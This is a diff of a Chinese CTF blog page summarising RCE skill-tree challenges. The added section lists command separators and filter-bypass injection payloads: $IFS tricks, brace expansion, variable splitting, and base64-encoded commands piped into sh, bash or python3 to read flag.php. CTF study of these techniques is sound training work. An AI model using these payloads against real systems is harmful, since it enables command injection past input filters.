@@ -22,12 +22,12 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"godice.top","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.21.1","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="---title: CTF_Show_RCE技能树categories: CTF 相关---RCE 总结命令分割符号：linux: -%0a(回车) %0d(换行)    -;     -&amp;       -|        -&amp;&amp;     -|| Windows: -%0a -&amp; -| -%1...">
+    <meta name="description" content="---title: CTF_Show_RCE技能树categories: CTF 相关---RCE总结命令注入命令分割符号：linux: -%0a(回车) %0d(换行)    -;     -&amp;       -|        -&amp;&amp;     -|| Windows: -%0a -&amp; -| ...">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CTF_Show_RCE技能树">
 <meta property="og:url" content="http://godice.top/CTF_Show_RCE%E6%8A%80%E8%83%BD%E6%A0%91.html">
 <meta property="og:site_name" content="冰神的小屋">
-<meta property="og:description" content="---title: CTF_Show_RCE技能树categories: CTF 相关---RCE 总结命令分割符号：linux: -%0a(回车) %0d(换行)    -;     -&amp;       -|        -&amp;&amp;     -|| Windows: -%0a -&amp; -| -%1...">
+<meta property="og:description" content="---title: CTF_Show_RCE技能树categories: CTF 相关---RCE总结命令注入命令分割符号：linux: -%0a(回车) %0d(换行)    -;     -&amp;       -|        -&amp;&amp;     -|| Windows: -%0a -&amp; -| ...">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/a668cc998bb727803602b1bc712728c8.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/a72122b8f61866a81cff769b349f9cd4.png">
@@ -73,7 +73,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/8198a2f4e656aab295e40c0432ef386c.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/f7f714502f9a29c7335de7cea5c48f73.png">
 <meta property="article:published_time" content="2024-11-05T09:29:14.000Z">
-<meta property="article:modified_time" content="2024-12-31T02:34:24.000Z">
+<meta property="article:modified_time" content="2024-12-31T03:06:43.000Z">
 <meta property="article:author" content="Godice">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/godicee/img/main/a668cc998bb727803602b1bc712728c8.png">
@@ -196,7 +196,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE-%E6%80%BB%E7%BB%93"><span class="nav-number">1.</span> <span class="nav-text">RCE 总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.</span> <span class="nav-text">RCE_ 文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">2.1.</span> <span class="nav-text">代码执行&amp;命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9Aeval%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">2.2.</span> <span class="nav-text">题目：eval执行(代码执行)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.3.</span> <span class="nav-text">题目：文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%A0%E5%8F%82%E6%96%B9%E5%BC%8F-get-post-cookie"><span class="nav-number">2.4.</span> <span class="nav-text">传参方式 get&#x2F;post&#x2F;cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9Aphp-input"><span class="nav-number">2.5.</span> <span class="nav-text">题目：php:&#x2F;&#x2F;input</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="nav-number">2.6.</span> <span class="nav-text">题目：读取源代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB"><span class="nav-number">2.7.</span> <span class="nav-text">题目：远程包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8Ballow-url-fopen-include"><span class="nav-number">2.8.</span> <span class="nav-text">远程allow_url_fopen&#x2F;include</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">RCE_ 命令注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-exec-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">3.1.</span> <span class="nav-text">题目：命令注入(exec 命令执行)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E7%A6%81%E7%94%A8-cat"><span class="nav-number">3.2.</span> <span class="nav-text">题目：禁用 cat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E7%A6%81%E7%94%A8%E7%A9%BA%E6%A0%BC"><span class="nav-number">3.3.</span> <span class="nav-text">题目：禁用空格</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">3.3.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IFS-%E7%BB%95%E8%BF%87"><span class="nav-number">3.3.2.</span> <span class="nav-text">$IFS$绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ASCII-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87-x20"><span class="nav-number">3.3.3.</span> <span class="nav-text">ASCII 编码绕过 \x20</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9A%E4%B9%89%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%BB%95%E8%BF%87"><span class="nav-number">3.3.4.</span> <span class="nav-text">定义表达式绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A0%E5%AF%86%E7%BB%95%E8%BF%87"><span class="nav-number">3.3.5.</span> <span class="nav-text">加密绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E8%BF%87%E6%BB%A4%E2%80%99-%E2%80%98"><span class="nav-number">3.4.</span> <span class="nav-text">题目：过滤’&#x2F;‘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E8%BF%87%E6%BB%A4%E2%80%99-%E5%92%8C-%E2%80%99"><span class="nav-number">3.5.</span> <span class="nav-text">题目：过滤’|| 和&amp;’</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%84%E5%90%88%E8%BF%87%E6%BB%A4%EF%BC%88%E5%89%8D%E9%9D%A2%E6%89%80%E6%9C%89%EF%BC%89"><span class="nav-number">3.6.</span> <span class="nav-text">组合过滤（前面所有）</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE%E6%80%BB%E7%BB%93"><span class="nav-number">1.</span> <span class="nav-text">RCE总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.</span> <span class="nav-text">命令注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E5%88%86%E5%89%B2%E7%AC%A6%E5%8F%B7%EF%BC%9A"><span class="nav-number">1.1.1.</span> <span class="nav-text">命令分割符号：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.2.</span> <span class="nav-text">绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.</span> <span class="nav-text">RCE_ 文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">2.1.</span> <span class="nav-text">代码执行&amp;命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9Aeval%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">2.2.</span> <span class="nav-text">题目：eval执行(代码执行)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.3.</span> <span class="nav-text">题目：文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%A0%E5%8F%82%E6%96%B9%E5%BC%8F-get-post-cookie"><span class="nav-number">2.4.</span> <span class="nav-text">传参方式 get&#x2F;post&#x2F;cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9Aphp-input"><span class="nav-number">2.5.</span> <span class="nav-text">题目：php:&#x2F;&#x2F;input</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="nav-number">2.6.</span> <span class="nav-text">题目：读取源代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB"><span class="nav-number">2.7.</span> <span class="nav-text">题目：远程包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8Ballow-url-fopen-include"><span class="nav-number">2.8.</span> <span class="nav-text">远程allow_url_fopen&#x2F;include</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">RCE_ 命令注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-exec-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">3.1.</span> <span class="nav-text">题目：命令注入(exec 命令执行)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E7%A6%81%E7%94%A8-cat"><span class="nav-number">3.2.</span> <span class="nav-text">题目：禁用 cat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E7%A6%81%E7%94%A8%E7%A9%BA%E6%A0%BC"><span class="nav-number">3.3.</span> <span class="nav-text">题目：禁用空格</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">3.3.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IFS-%E7%BB%95%E8%BF%87"><span class="nav-number">3.3.2.</span> <span class="nav-text">$IFS$绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ASCII-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87-x20"><span class="nav-number">3.3.3.</span> <span class="nav-text">ASCII 编码绕过 \x20</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9A%E4%B9%89%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%BB%95%E8%BF%87"><span class="nav-number">3.3.4.</span> <span class="nav-text">定义表达式绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A0%E5%AF%86%E7%BB%95%E8%BF%87"><span class="nav-number">3.3.5.</span> <span class="nav-text">加密绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E8%BF%87%E6%BB%A4%E2%80%99-%E2%80%98"><span class="nav-number">3.4.</span> <span class="nav-text">题目：过滤’&#x2F;‘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E8%BF%87%E6%BB%A4%E2%80%99-%E5%92%8C-%E2%80%99"><span class="nav-number">3.5.</span> <span class="nav-text">题目：过滤’|| 和&amp;’</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%84%E5%90%88%E8%BF%87%E6%BB%A4%EF%BC%88%E5%89%8D%E9%9D%A2%E6%89%80%E6%9C%89%EF%BC%89"><span class="nav-number">3.6.</span> <span class="nav-text">组合过滤（前面所有）</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -309,7 +309,7 @@
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
       <meta itemprop="name" content="CTF_Show_RCE技能树 | 冰神的小屋">
-      <meta itemprop="description" content="---title: CTF_Show_RCE技能树categories: CTF 相关---RCE 总结命令分割符号：linux: -%0a(回车) %0d(换行)    -;     -&amp;       -|        -&amp;&amp;     -|| Windows: -%0a -&amp; -| -%1...">
+      <meta itemprop="description" content="---title: CTF_Show_RCE技能树categories: CTF 相关---RCE总结命令注入命令分割符号：linux: -%0a(回车) %0d(换行)    -;     -&amp;       -|        -&amp;&amp;     -|| Windows: -%0a -&amp; -| ...">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -331,7 +331,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-12-31 10:34:24" itemprop="dateModified" datetime="2024-12-31T10:34:24+08:00">2024-12-31</time>
+      <time title="修改时间：2024-12-31 11:06:43" itemprop="dateModified" datetime="2024-12-31T11:06:43+08:00">2024-12-31</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -371,33 +371,70 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>2.3k</span>
+      <span>2.6k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>8 分钟</span>
+      <span>9 分钟</span>
     </span>
 </div>
 
-            <div class="post-description">---title: CTF_Show_RCE技能树categories: CTF 相关---RCE 总结命令分割符号：linux: -%0a(回车) %0d(换行)    -;     -&amp;       -|        -&amp;&amp;     -|| Windows: -%0a -&amp; -| -%1...</div>
+            <div class="post-description">---title: CTF_Show_RCE技能树categories: CTF 相关---RCE总结命令注入命令分割符号：linux: -%0a(回车) %0d(换行)    -;     -&amp;       -|        -&amp;&amp;     -|| Windows: -%0a -&amp; -| ...</div>
         </div>
       </header>
 
     
     
     
-    <div class="post-body" itemprop="articleBody"><h2 id="RCE-总结"><a href="#RCE-总结" class="headerlink" title="RCE 总结"></a>RCE 总结</h2><p><strong><font style="color:#DF2A3F;">命令分割符号：</font></strong></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">linux:</span><br><span class="line">-%0a(回车) %0d(换行)   </span><br><span class="line">-;    </span><br><span class="line">-&amp;      </span><br><span class="line">-|       </span><br><span class="line">-&amp;&amp;    </span><br><span class="line">-||</span><br><span class="line">Windows:</span><br><span class="line">-%0a</span><br><span class="line">-&amp;</span><br><span class="line">-|</span><br><span class="line">-%1a（作为.bat文件中的命令分隔符）</span><br></pre></td></tr></table></figure>
+    <div class="post-body" itemprop="articleBody"><h2 id="RCE总结"><a href="#RCE总结" class="headerlink" title="RCE总结"></a>RCE总结</h2><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><h4 id="命令分割符号："><a href="#命令分割符号：" class="headerlink" title="命令分割符号："></a><font style="color:#DF2A3F;">命令分割符号：</font></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">linux:</span><br><span class="line">-%0a(回车) %0d(换行)   </span><br><span class="line">-;    </span><br><span class="line">-&amp;      </span><br><span class="line">-|       </span><br><span class="line">-&amp;&amp;    </span><br><span class="line">-||</span><br><span class="line">Windows:</span><br><span class="line">-%0a</span><br><span class="line">-&amp;</span><br><span class="line">-|</span><br><span class="line">-%1a（作为.bat文件中的命令分隔符）</span><br></pre></td></tr></table></figure>
 
 
 
-
-
-
-
+<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><ul>
+<li>**<font style="color:#DF2A3F;">cat</font>**：用<code>ca\t</code>or 定义表达式</li>
+<li>**<font style="color:#DF2A3F;">空格</font>**：用<code>$IFS$1</code>、大括号扩展<code>&#123;cat,flag.php&#125;</code>、<code>cat&lt;flag.php</code>、<code>cat&lt;&gt;</code><ul>
+<li>1<code>&#123;cat,flag.php&#125;</code>大括号扩展：生成一个逗号分割的字符串集合</li>
+<li>会分别执行 cat flag.php</li>
+<li>2<code>cat$&#123;IFS&#125;flag.php</code>内部字段分隔符 IFS：相当于空格、制表、换行</li>
+<li>3<code>cat$IFS$9flag.php</code>$9 是第 9 个参数<ul>
+<li>可以理解为无意义字符，为了绕过检测用的（其实指向第九个参数，这里根本没有指定参数）</li>
+</ul>
+</li>
+<li>4<code>cat&lt;flag.php</code>flag.php 重定向为 cat 的输入</li>
+<li>5<code>cat&lt;&gt;flag.php</code>读取并写入 flag.php<ul>
+<li>其实等于 4，读取再写入</li>
+</ul>
+</li>
+<li>6<code>kg=$&#39;\x20flag.php&#39;&amp;&amp;cat$kg</code>定义<code>kg=$&#39;\x20flag.php&#39;</code>其中 \x20 是 ASCII 中的空格<ul>
+<li>直接定义访问了</li>
+</ul>
+</li>
+<li>7<code>a=c;b=at;c=flag.php;$a$b $c</code>定义表达式访问<ul>
+<li><code>a=ca;b=$&#39;t\x20&#39;;c=flag.php;$a$b$c</code>也可以</li>
+</ul>
+</li>
+<li>8<code>b=ag;a=fl;cat$IFS$1$a$b.php</code>定义表达式+内部字段分割符</li>
+<li>9<code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code><ul>
+<li>用 echo 输出 base64 编码的<code>cat flag</code>管道到 base64 解密，然后管道到 sh 中执行</li>
+</ul>
+</li>
+<li>10<code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</code>只是把执行换位了 bash</li>
+<li>11<code>echo$IFS$1aW1wb3J0IG9zCnByaW50KG9zLnN5c3RlbSgnY2F0IGZsYWcucGhwJykp|base64$IFS$1-d|python3</code>用的 python 来执行<ul>
+<li><code>import os</code></li>
+<li><code>print(os.system(&#39;cat flag.php&#39;))</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>**<font style="color:#DF2A3F;">最好用的是定义表达式</font>**：<ul>
+<li>比如正常的<code>cat flag.php</code></li>
+<li><code>;a=fl;b=ag.php;cat$IFS$1$a$b</code></li>
+</ul>
+</li>
+</ul>
 <h2 id="RCE-文件包含"><a href="#RCE-文件包含" class="headerlink" title="RCE_ 文件包含"></a>RCE_ 文件包含</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.ctfhub.com/#/skilltree">技能树连接</a></p>
 <p>ctf_show 的 RCE 的技能树</p>
 <p><img src="https://raw.githubusercontent.com/godicee/img/main/a668cc998bb727803602b1bc712728c8.png"></p>
@@ -743,7 +780,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:02</span>
+    <span title="站点阅读时长">1:03</span>
   </span>
 </div>
 <div class="busuanzi-count">
